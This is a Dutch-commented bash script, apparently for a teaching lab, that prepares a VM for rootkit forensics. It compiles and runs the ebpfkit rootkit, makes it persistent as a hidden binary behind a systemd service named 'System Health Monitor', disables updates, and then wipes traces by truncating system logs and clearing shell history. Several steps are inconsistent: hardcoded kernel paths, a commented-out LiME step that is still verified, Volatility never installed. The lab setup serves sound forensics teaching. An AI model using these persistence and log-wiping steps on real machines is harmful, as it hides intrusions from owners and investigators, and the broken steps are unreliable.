#!/bin/bash
# ============================================================================
# ebpfkit Rootkit Lab - Docentensetup Script
# ============================================================================
# Dit script bereidt de VM volledig voor zodat studenten enkel nog
# hoeven in te loggen en te analyseren. Voer dit uit op de VM als
# de 'student' gebruiker (met sudo-rechten).
#
# Volgorde:
#   1. APT repositories aanpassen (Ubuntu 20.04 Focal)
#   2. Dependencies installeren (Go, clang/llvm 11, go-bindata)
#   3. ebpfkit compileren & laden
#   4. Persistentie instellen
#   5. LiME installeren (kernel module vooraf compileren)
#   6. Volatility 3 installeren
#   7. ISF-profiel genereren & installeren
#   8. Sporen verwijderen
#   9. Verificatie
# ============================================================================

set -e  # Stop bij eerste fout

echo "=== STAP 1: APT Repositories Controleren ==="
# Ubuntu 20.04 (Focal) is nog ondersteund — standaard repositories werken
sudo apt update

echo ""
echo "=== STAP 2: Dependencies Installeren ==="
sudo apt update && sudo apt upgrade -y
sudo apt install -y \
    build-essential \
    clang-11 \
    llvm-11 \
    libelf-dev \
    linux-headers-$(uname -r) \
    linux-tools-$(uname -r) \
    linux-tools-common \
    gcc \
    make \
    git \
    pkg-config \
    libssl-dev \
    bpfcc-tools \
    libbpf-dev \
    wget \
    curl \
    net-tools \
    python3 \
    python3-pip \
    golang-go \
    graphviz

# Zorg dat clang-11 de standaard clang is
sudo update-alternatives --install /usr/bin/clang clang /usr/bin/clang-11 100
sudo update-alternatives --install /usr/bin/llc llc /usr/bin/llc-11 100
sudo update-alternatives --install /usr/bin/llvm-strip llvm-strip /usr/bin/llvm-strip-11 100

# go-bindata installeren (vereist door ebpfkit Makefile)
go get -u github.com/shuLhan/go-bindata/... 2>/dev/null || \
    go install github.com/shuLhan/go-bindata/cmd/go-bindata@latest

echo ""
echo "=== STAP 3: Versies Controleren ==="
echo "Kernel: $(uname -r)"
echo "GCC:    $(gcc --version | head -1)"
echo "Clang:  $(clang --version | head -1)"
echo "Python: $(python3 --version)"
echo "Go:     $(go version)"

echo ""
echo "=== STAP 4: ebpfkit Downloaden en Compileren ==="
cd /opt
sudo git clone https://github.com/Gui774ume/ebpfkit.git
sudo chown -R $(whoami):$(whoami) /opt/ebpfkit
cd /opt/ebpfkit

# PATH uitbreiden zodat go-bindata gevonden wordt
export PATH=$PATH:$(go env GOPATH)/bin

# Compileren (genereert bin/ebpfkit, bin/webapp, bin/ebpfkit-client)
make

echo "Gebouwde binaries:"
ls -lh bin/

echo ""
echo "=== STAP 5: Rootkit Laden ==="
cd /opt/ebpfkit
# ebpfkit verbergt zichzelf standaard voor bpf syscall
sudo ./bin/ebpfkit &
sleep 3
echo "ebpfkit gestart (achtergrond PID: $!)"

echo ""
echo "=== STAP 6: Persistentie Instellen ==="
# Binary kopiëren naar een onopvallende locatie
sudo cp /opt/ebpfkit/bin/ebpfkit /usr/local/bin/.system-health
sudo chmod +x /usr/local/bin/.system-health

# Systemd service aanmaken
sudo tee /etc/systemd/system/system-health.service > /dev/null << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.system-health
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable system-health.service
sudo systemctl start system-health.service
echo "Persistentie ingesteld via systemd service: system-health.service"

echo ""
echo "=== STAP 7: ISF-profiel Genereren voor Volatility ==="
KERNEL_VERSION=$(uname -r)
echo "Kernelversie: $KERNEL_VERSION"

# Ubuntu 20.04 Focal: debug symbols via apt
echo "Debug symbols downloaden..."
echo "deb http://ddebs.ubuntu.com focal main restricted universe multiverse" | \
    sudo tee /etc/apt/sources.list.d/ddebs.list

sudo apt-key adv --keyserver keyserver.ubuntu.com \
    --recv-keys F2EDC64DC5AEE1F6B9C621F0C8CAB6595FDFF622 2>/dev/null || true
sudo apt update || true

echo "deb http://ddebs.ubuntu.com $(lsb_release -cs) main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-updates main restricted universe multiverse
deb http://ddebs.ubuntu.com $(lsb_release -cs)-proposed main restricted universe multiverse" | sudo tee /etc/apt/sources.list.d/ddebs.list

sudo apt install ubuntu-dbgsym-keyring
sudo apt update
sudo apt install linux-image-$(uname -r)-dbgsym


VMLINUX="/usr/lib/debug/boot/vmlinux-${KERNEL_VERSION}"
SYSTEM_MAP="/boot/System.map-${KERNEL_VERSION}"

if [ ! -f "$VMLINUX" ]; then
    echo "FOUT: vmlinux niet gevonden op $VMLINUX"
    exit 1
fi
echo "vmlinux gevonden: $VMLINUX"

# dwarf2json bouwen
echo "dwarf2json bouwen..."
cd /tmp
git clone https://github.com/volatilityfoundation/dwarf2json.git
cd dwarf2json
go build .

# ISF-profiel genereren (5-15 minuten, ~8GB RAM nodig)
echo "ISF-profiel genereren (kan 5-15 min duren)..."
PROFILE_NAME="linux-ubuntu-focal-${KERNEL_VERSION}.json"

./dwarf2json linux \
    --elf "/usr/lib/debug/boot/vmlinux-5.15.0-179-generic" \
    --system-map "/boot/System.map-5.15.0-179-generic" \
    > "/tmp/linux-ubuntu-focal-5.15.0-179-generic.json"

echo "ISF-profiel gegenereerd: $(du -h /tmp/${PROFILE_NAME})"

# echo "=== STAP 7: LiME Installeren (kernel module vooraf compileren) ==="
# # LiME moet exact gecompileerd worden voor de draaiende kernel.
# # Door dit nu te doen, hoeven studenten zelf niets te compileren.
# cd /tmp/
# sudo git clone https://github.com/504ensicsLabs/LiME.git
# cd LiME/src
# make

# # Controleer dat de module gebouwd is
# echo "LiME gebouwd: $(ls lime-$(uname -r).ko)"
# make 
# # Geef de student eigenaarschap
# sudo chown -R student:student /opt/LiME
# insmod ./lime-$(uname -r).ko "path=/tmp/ram.lime format=lime"
echo "=== STAP 8: Kernel versie vast zetten ==="
# 1. Zet de specifieke 5.15.0-179 packages vast
sudo apt-mark hold linux-image-5.15.0-179-generic
sudo apt-mark hold linux-headers-5.15.0-179-generic
sudo apt-mark hold linux-modules-5.15.0-179-generic
sudo apt-mark hold linux-modules-extra-5.15.0-179-generic

# 2. Zet de generic meta-packages vast (dit voorkomt dat Ubuntu een nieuwere kernelversie trekt)
sudo apt-mark hold linux-image-generic
sudo apt-mark hold linux-headers-generic

# Schakel automatische apt-updates uit
sudo sed -i 's/APT::Periodic::Update-Package-Lists "1";/APT::Periodic::Update-Package-Lists "0";/' /etc/apt/apt.conf.d/20auto-upgrades
sudo sed -i 's/APT::Periodic::Unattended-Upgrade "1";/APT::Periodic::Unattended-Upgrade "0";/' /etc/apt/apt.conf.d/20auto-upgrades

# Stop en disable de service
sudo systemctl stop unattended-upgrades
sudo systemctl disable unattended-upgrades

echo "=== STAP 9: Ram dump maken ==="
./VBoxManage list runningvms
./VBoxManage controlvm "ebpfkit" pause
./VBoxManage debugvm "ebpfkit" dumpvmcore --filename="C:\Users\username\Downloads\memory_dump.elf"
./VBoxManage controlvm "ebpfkit" resume

echo ""
echo "=== STAP 10: Sporen Verwijderen ==="
# ebpfkit broncode verwijderen (binary staat al in /usr/local/bin/.system-health)
sudo rm -rf /opt/ebpfkit

# dwarf2json en build artifacts verwijderen
sudo rm -rf /tmp/dwarf2json
sudo rm -f "/tmp/${PROFILE_NAME}"

# Debug symbols verwijderen (bespaart ~500MB schijfruimte)
sudo apt remove -y "linux-image-${KERNEL_VERSION}-dbgsym" 2>/dev/null || true
sudo rm -f /etc/apt/sources.list.d/ddebs.list
sudo apt update > /dev/null 2>&1

# Logs opschonen
sudo journalctl --vacuum-time=1s
sudo truncate -s 0 /var/log/syslog 2>/dev/null || true
sudo truncate -s 0 /var/log/auth.log 2>/dev/null || true
sudo truncate -s 0 /var/log/kern.log 2>/dev/null || true

# APT cache opschonen
sudo apt autoremove -y && sudo apt clean
dd if=/dev/zero of=/tmp/zero.small.file bs=1M || true
rm /tmp/zero.small.file
sync
# Bash history wissen
history -c
cat /dev/null > ~/.bash_history


echo ""
echo "=== STAP 11: Verificatie ==="

echo "--- Rootkit actief? ---"
systemctl is-active system-health.service && echo "OK: ebpfkit service actief" || echo "FOUT: ebpfkit service niet actief!"

echo ""
echo "--- lsmod (mag niets verdachts tonen) ---"
lsmod | head -20

echo ""
echo "--- bpftool (rootkit verbergt zichzelf standaard) ---"
sudo bpftool prog list 2>/dev/null | head -20 || echo "(bpftool niet beschikbaar of verborgen)"

echo ""
echo "--- LiME kernel module aanwezig? ---"
ls /opt/LiME/src/lime-$(uname -r).ko > /dev/null 2>&1 && \
    echo "OK: LiME module aanwezig (/opt/LiME/src/lime-$(uname -r).ko)" || \
    echo "FOUT: LiME module ontbreekt!"

echo ""
echo "--- Volatility 3 aanwezig? ---"
python3 /opt/volatility3/vol.py --help > /dev/null 2>&1 && \
    echo "OK: Volatility 3 werkt" || \
    echo "FOUT: Volatility 3 werkt niet!"

echo ""
echo "--- ISF-profiel aanwezig? ---"
ls /opt/volatility3/volatility3/symbols/linux/*.json > /dev/null 2>&1 && \
    echo "OK: ISF-profiel aanwezig" || \
    echo "FOUT: ISF-profiel ontbreekt!"

echo ""
echo "============================================================================"
echo "KLAAR! De VM is volledig geconfigureerd voor de studenten."
echo ""
echo "Volgende stap: sluit de VM af en exporteer als .ova:"
echo "  sudo shutdown -h now"
echo "  VBoxManage export \"ebpfkit-Lab\" -o ebpfkit-Lab.ova"
echo ""
echo "Studenten hoeven enkel nog in te loggen en de opdracht te volgen."
echo "============================================================================"
